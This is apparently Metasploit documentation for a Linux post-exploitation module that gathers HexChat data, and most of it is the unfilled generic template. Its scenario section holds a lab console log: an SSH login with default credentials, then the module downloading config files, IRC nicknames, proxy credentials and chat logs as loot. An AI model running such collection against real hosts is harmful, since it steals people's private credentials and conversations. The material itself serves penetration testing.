The following is the recommended format for module documentation. But feel free to add more content/sections to this.
One of the general ideas behind these documents is to help someone troubleshoot the module if it were to stop
functioning in 5+ years, so giving links or specific examples can be VERY helpful.

## Vulnerable Application

Instructions to get the vulnerable application.  If applicable, include links to the vulnerable install files, as well as instructions on installing/configuring the environment if it is different than a standard install. Much of this will come from the PR, and can be copy/pasted.

## Verification Steps
  Example steps in this format (is also in the PR):

  1. Install the application
  2. Start msfconsole
  3. Do: ```use [module path]```
  4. Do: ```run```
  5. You should get a shell.
 
## Options
List each option and how to use it. 

### Option Name

Talk about what it does, and how to use it appropriately.  If the default value is likely to change, include the default value here.

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.


### Hexchat 2.14.3 on Fedora 31

    ```
    [*] Processing xchat.rb for ERB directives.
    resource (xchat.rb)> use auxiliary/scanner/ssh/ssh_login
    resource (xchat.rb)> set username fedora
    username => fedora
    resource (xchat.rb)> set password fedora
    password => fedora
    resource (xchat.rb)> set rhosts 192.168.2.145
    rhosts => 192.168.2.145
    resource (xchat.rb)> run
    [+] 192.168.2.145:22 - Success: 'fedora:fedora' ''
    [*] Command shell session 1 opened (192.168.2.128:40023 -> 192.168.2.145:22) at 2020-04-22 07:17:59 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    resource (xchat.rb)> use post/linux/gather/enum_hexchat
    resource (xchat.rb)> set session -1
    session => -1
    resource (xchat.rb)> set verbose true
    verbose => true
    resource (xchat.rb)> run
    [!] SESSION may not be compatible with this module.
    [*] Detcted username: fedora
    [+] Downloading: /home/fedora/.config/hexchat/servlist.conf
    [+] Downloading: /home/fedora/.config/hexchat/hexchat.conf
    [+] IRC nick: test14123251232151
    [+] IRC nick1: test1251212123151
    [+] IRC nick2: test123123123
    [+] IRC nick3: test321321321
    [+] Proxy conf: 1.1.1.1:9999 -> proxyusername/proxypass
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/freenode.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/#postgresql.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/#python-unregistered.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/freenode/server.log
    [*] Downloading: /home/fedora/.config/hexchat//logs/NETWORK/server.log
    [+] servlist.conf saved as /home/h00die/.msf4/loot/20200422071815_default_192.168.2.145_hexchat.config_359863.txt
    [+] hexchat.conf saved as /home/h00die/.msf4/loot/20200422071816_default_192.168.2.145_hexchat.config_347758.txt
    [+] freenode.log saved as /home/h00die/.msf4/loot/20200422071816_default_192.168.2.145_hexchat.chatlogs_364082.txt
    [+] #postgresql.log saved as /home/h00die/.msf4/loot/20200422071816_default_192.168.2.145_hexchat.chatlogs_991489.txt
    [+] #python-unregistered.log saved as /home/h00die/.msf4/loot/20200422071816_default_192.168.2.145_hexchat.chatlogs_760685.txt
    [+] server.log saved as /home/h00die/.msf4/loot/20200422071816_default_192.168.2.145_hexchat.chatlogs_022702.txt
    [+] server.log saved as /home/h00die/.msf4/loot/20200422071816_default_192.168.2.145_hexchat.chatlogs_433357.txt
    [*] Post module execution completed
    ```
